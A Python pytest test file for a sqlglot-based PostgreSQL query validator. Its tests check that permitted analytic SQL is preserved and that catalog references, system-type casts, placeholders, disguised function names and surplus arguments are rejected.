class TestOperatorReviewRegressions:
    @pytest.mark.parametrize(
        "expression",
        [
            "'{\"a\":1}'::jsonb @> '{\"a\":1}'::jsonb",
            "'{\"a\":1}'::jsonb <@ '{\"a\":1}'::jsonb",
            "'{\"a\":1}'::jsonb #> '{a}'",
            "'{\"a\":1}'::jsonb #>> '{a}'",
            "'{\"a\":1}'::jsonb ? 'a'",
            "'{\"a\":1}'::jsonb ?| ARRAY['a']",
            "'{\"a\":1}'::jsonb ?& ARRAY['a']",
            "'{\"a\":1}'::jsonb @? '$.a'",
            "'{\"a\":1}'::jsonb @@ '$.a == 1'",
            "ARRAY[1, 2] && ARRAY[2]",
            "'{\"a\":1}'::jsonb #- '{a}'",
            "localtime",
        ],
    )
    def test_core_operator_roundtrip(self, expression):
        original = sqlglot.parse_one(f"SELECT {expression}", dialect="postgres")
        rewritten = SQLValidator().validate(f"SELECT {expression}")
        assert rewritten.sql(dialect="postgres") == original.sql(dialect="postgres")

    @pytest.mark.parametrize("catalog", ["otherdb", "scout"])
    def test_catalog_table_rejected(self, catalog):
        with pytest.raises(SQLValidationError, match=catalog) as error:
            SQLValidator().validate(f"SELECT * FROM {catalog}.public.users")
        assert error.value.error_type == "catalog_not_allowed"

    def test_object_identifier_rejected_even_with_allowed_enum(self):
        statement = exp.select(
            exp.Cast(this=exp.Null(), to=exp.ObjectIdentifier(this=exp.DType.TEXT))
        )
        with pytest.raises(SQLValidationError) as error:
            SQLValidator()._validate_cast_types(statement, "SELECT NULL::regclass")
        assert error.value.error_type == "cast_type_not_allowed"

    def test_type_error_names_column_definition_type(self):
        with pytest.raises(SQLValidationError, match="(?i)type 'oid'"):
            SQLValidator().validate("SELECT * FROM unnest(ARRAY[1]) AS s(a oid)")

    @pytest.mark.parametrize(
        "name",
        [
            "array_contains_all",
            "array_contained_by",
            "jsonb_extract",
            "jsonb_extract_scalar",
            "j_s_o_n_b_contains_top_key",
            "j_s_o_n_b_contains_any_top_keys",
            "j_s_o_n_b_contains_all_top_keys",
            "j_s_o_n_b_path_exists",
            "match_against",
            "array_overlaps",
            "j_s_o_n_b_delete_at_path",
            "localtime",
        ],
    )
    def test_operator_internal_name_never_authorizes_anonymous_function(self, name):
        statement = exp.select(exp.Anonymous(this=name, expressions=[exp.Literal.number(1)]))
        with pytest.raises(SQLValidationError) as error:
            SQLValidator()._validate_no_dangerous_functions(statement, f"SELECT {name}(1)")
        assert error.value.error_type == "function_not_allowed"


class TestGenerationReviewRegressions:
    @pytest.mark.parametrize(
        "expression", ["current_time", "current_time(3)", "current_timestamp(3)"]
    )
    def test_current_time_preserves_postgres_syntax(self, expression):
        rendered = SQLValidator().validate(f"SELECT {expression}").sql(dialect="postgres")
        assert rendered == f"SELECT {expression.upper()}"

    def test_reject_malformed_match_call(self):
        with pytest.raises(SQLValidationError, match="@@"):
            SQLValidator().validate("SELECT match_against(a, b) FROM t")

    def test_reject_unary_at_with_supported_alternative(self):
        with pytest.raises(SQLValidationError, match="abs"):
            SQLValidator().validate("SELECT @ x")

    @pytest.mark.parametrize("name", sorted(ALLOWED_ANALYTICS_FUNCTIONS))
    @pytest.mark.parametrize("arity", range(6))
    def test_real_parser_alias_calls_generate_or_reject(self, name, arity):
        arguments = ", ".join(f"scout_arg_{index}" for index in range(arity))
        validator = SQLValidator()
        try:
            statement = validator.validate(f"SELECT {name}({arguments}) FROM t")
        except SQLValidationError:
            return
        rendered = validator.inject_limit(statement).sql(dialect="postgres")
        assert rendered
        for index in range(arity):
            assert f"scout_arg_{index}" in rendered.lower()


class TestInvalidInputRecovery:
    @pytest.mark.parametrize("placeholder", ["%s", "?", ":name", "$1"])
    def test_placeholder_rejected(self, placeholder):
        with pytest.raises(SQLValidationError, match="parameters"):
            SQLValidator().validate(f"SELECT 1 WHERE 1 = {placeholder}")

    def test_percent_literal_is_not_placeholder(self):
        assert SQLValidator().validate("SELECT * FROM t WHERE a LIKE '%50%'") is not None

    @pytest.mark.parametrize(
        "expression",
        [
            "regexp_like('abc', 'b', 'i', 'extra')",
            "current_timestamp('a', 'b')",
        ],
    )
    def test_custom_rewrite_does_not_drop_extra_arguments(self, expression):
        with pytest.raises(SQLValidationError, match="arguments"):
            SQLValidator().validate(f"SELECT {expression}")


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT count(DISTINCT a), array_agg(a ORDER BY a DESC) FILTER (WHERE a > 0) FROM (VALUES (1), (2), (2)) t(a)",
        "SELECT string_agg(DISTINCT a, ',' ORDER BY a) FROM (VALUES ('a'), ('b')) t(a)",
        "SELECT percentile_cont(0.5) WITHIN GROUP (ORDER BY a) FROM (VALUES (1), (2)) t(a)",
        "SELECT sum(a) OVER (ORDER BY a ROWS BETWEEN 1 PRECEDING AND CURRENT ROW) FROM (VALUES (1), (2)) t(a)",
        "SELECT CASE WHEN true THEN coalesce(NULL, 1) ELSE 2 END",
        "SELECT trim(BOTH 'x' FROM 'xxabcx'), trim('abc'), btrim('xxa', 'x'), ltrim('xxa', 'x'), rtrim('axx', 'x')",
        "SELECT substring('abcdef' FROM 2 FOR 3), substring('abcdef' FOR 3 FROM 2), substring('abcdef', 2, 3)",
        "SELECT extract(year FROM DATE '2026-01-01'), date_part('year', DATE '2026-01-01')",
        "SELECT date_trunc('day', TIMESTAMP '2026-01-01 12:00:00'), date_trunc('day', TIMESTAMPTZ '2026-01-01 12:00:00Z', 'UTC')",
        "SELECT round(1.235, 2), mod(7, 3), lpad('a', 5, '.'), rpad('a', 5, '.')",
        "SELECT to_char(TIMESTAMP '2026-01-01', 'YYYY-MM-DD'), to_date('2026-01-01', 'YYYY-MM-DD'), to_number('12', '99')",
        "SELECT to_timestamp(0), to_timestamp('2026-01-01', 'YYYY-MM-DD')",
        "SELECT json_build_object('a', 1, 'b', 2), jsonb_build_object('a', 1), json_build_array(1, 'a'), jsonb_build_array(1, 'b')",
        "SELECT json_object_agg(a,b), jsonb_object_agg(a,b), json_agg(b), jsonb_agg(b) FROM (VALUES ('x',1),('y',2)) t(a,b)",
        "SELECT jsonb_array_elements('[1,2]'::jsonb)",
        "SELECT '{\"a\":1}'::jsonb @> '{\"a\":1}', '{\"a\":1}'::jsonb ? 'a', '{\"a\":1}'::jsonb @@ '$.a == 1'",
        "SELECT regexp_like('ABC', 'abc', 'i'), regexp_like('abc', 'b'), 'abc' ~ 'b', 'ABC' ~* 'b'",
        "SELECT current_time, current_time(3), current_timestamp(0), localtime(3)",
        "SELECT position('b' IN 'abc'), char_length('abc'), length('abc'), upper('abc'), concat('a','b','c')",
        "SELECT (ARRAY[1,2,3])[1]",
        "SELECT array_length(ARRAY[1,2],1), cardinality(ARRAY[1,2]), array_to_string(ARRAY[1,2], ',')",
        "SELECT EXISTS(SELECT 1, 2), EXISTS(SELECT 1 WHERE false)",
        "SELECT greatest(1,2,3), least(1,2), nullif(1,2), coalesce(NULL,1,2)",
        "SELECT generate_series(1,3), power(2,3), log(10,100), trunc(1.235,2)",
        "SELECT bool_and(a), bool_or(a) FROM (VALUES (true),(false)) t(a)",
        "SELECT variance(a), var_pop(a), stddev(a), corr(a,a) FROM (VALUES (1),(2),(3)) t(a)",
        "SELECT CAST('1' AS numeric(10,2)), CAST(ARRAY[1,2] AS integer[])",
        "WITH RECURSIVE seq(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM seq WHERE n<3) SELECT sum(n) FROM seq",
        "SELECT a, sum(a) FROM (VALUES (1),(2)) t(a) GROUP BY ROLLUP(a) ORDER BY a NULLS LAST",
        "SELECT x.a, y.b FROM (VALUES (1),(2)) x(a) CROSS JOIN LATERAL (SELECT x.a+1 AS b) y ORDER BY x.a",
    ],
)
def test_valid_postgres_argument_shapes_preserved(sql):
    validator = SQLValidator()
    assert validator.inject_limit(validator.validate(sql)).sql(dialect="postgres")


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT count(DISTINCT (a,b)) FROM (VALUES (1,2),(1,3)) t(a,b)",
        "SELECT array_agg(CASE WHEN a>0 THEN ARRAY[a,2] ELSE ARRAY[0,2] END ORDER BY b) FROM (VALUES (1,2)) t(a,b)",
        "SELECT coalesce((SELECT 1), CASE WHEN true THEN 2 ELSE 3 END)",
    ],
)
def test_nested_operand_shapes_preserved(sql):
    validator = SQLValidator()
    assert validator.inject_limit(validator.validate(sql)).sql(dialect="postgres")


@pytest.mark.parametrize(
    "expression",
    [
        "array_agg(a,b)",
        "array_agg(a,b ORDER BY c)",
        "round(1.235,2,1)",
        "mod(7,3,1)",
        "ltrim('xxa','x','y')",
        "rtrim('axx','x','y')",
        "substring('abcdef',2,3,4)",
        "lpad('a',5,'.','x')",
        "length('abc','utf8','x')",
        "to_char(current_timestamp,'YYYY','x')",
        "date_trunc('day',current_timestamp,'UTC','x')",
        "string_agg(a,b,c)",
        "string_agg(a,b,c ORDER BY a)",
        "regexp_i_like('a','b','i')",
    ],
)
def test_discarded_source_arguments_rejected(expression):
    with pytest.raises(SQLValidationError, match="arguments"):
        SQLValidator().validate(f"SELECT {expression} FROM t")


@pytest.mark.parametrize(
    "function",
    [
        "json_extract_path",
        "json_extract_path_text",
        "jsonb_extract_path",
        "jsonb_extract_path_text",
    ],
)
def test_variadic_json_path_arguments_preserved(function):
    rendered = (
        SQLValidator()
        .validate(f"SELECT {function}(document, 'a', 'b') FROM t")
        .sql(dialect="postgres")
    )
    assert "'a', 'b'" in rendered


@pytest.mark.parametrize("function", ["date_trunc", "date_part"])
@pytest.mark.parametrize(
    "unit",
    [
        "unit",
        "day",
        "t.unit",
        "t.year",
        "unit::text",
        "coalesce(unit, 'day')",
        "(SELECT 'year')",
        "'day'",
    ],
)
def test_datetime_function_units_remain_expressions(function, unit):
    rendered = (
        SQLValidator().validate(f"SELECT {function}({unit}, ts) FROM t").sql(dialect="postgres")
    )
    parsed = sqlglot.parse_one(f"SELECT {unit}", dialect="postgres").expressions[0]
    expected_unit = parsed.sql(dialect="postgres")
    if unit.startswith("coalesce"):
        expected_unit = "COALESCE(unit, 'day')"
    assert f"pg_catalog.{function}({expected_unit}, ts)" in rendered


@pytest.mark.parametrize(
    "query",
    [
        "SELECT timestamp_trunc(ts, day) FROM t",
        "SELECT timestamp_trunc('day', ts) FROM t",
        "SELECT extract(unit, ts) FROM t",
    ],
)
def test_non_postgres_datetime_spellings_rejected(query):
    with pytest.raises(SQLValidationError):
        SQLValidator().validate(query)


@pytest.mark.parametrize(
    ("sql", "expected"),
    [
        (
            "SELECT * FROM orders WHERE EXISTS (WITH orders AS (SELECT 1 AS n) SELECT n FROM orders)",
            ["orders"],
        ),
        (
            "WITH c AS (SELECT * FROM orders) SELECT * FROM c WHERE EXISTS (SELECT 1 FROM c)",
            ["orders"],
        ),
        ("WITH orders AS (SELECT * FROM orders) SELECT * FROM orders", ["orders"]),
        (
            "WITH orders AS (SELECT * FROM source) SELECT * FROM orders WHERE EXISTS (WITH orders AS (SELECT * FROM other) SELECT * FROM orders)",
            ["source", "other"],
        ),
        (
            "WITH RECURSIVE r(n) AS (SELECT id FROM seeds UNION ALL SELECT n+1 FROM r WHERE n<3) SELECT * FROM r",
            ["seeds"],
        ),
        (
            "WITH RECURSIVE a AS (SELECT * FROM b), b AS (SELECT * FROM source) SELECT * FROM a",
            ["source"],
        ),
        (
            "WITH a AS (SELECT * FROM b), b AS (SELECT * FROM source) SELECT * FROM a",
            ["b", "source"],
        ),
        ('WITH "Orders" AS (SELECT 1) SELECT * FROM orders', ["orders"]),
        ("WITH Orders AS (SELECT 1) SELECT * FROM orders", []),
        ('WITH "Orders" AS (SELECT 1) SELECT * FROM "Orders"', []),
        (
            "WITH orders AS (SELECT 1) SELECT * FROM public.orders JOIN ws_demo.orders USING (id)",
            ["public.orders", "ws_demo.orders"],
        ),
    ],
)
def test_cte_table_provenance_obeys_lexical_scope(sql, expected):
    validator = SQLValidator(schema="ws_demo")
    statement = validator.validate(sql)
    assert sorted(validator.get_tables_accessed(statement)) == sorted(expected)
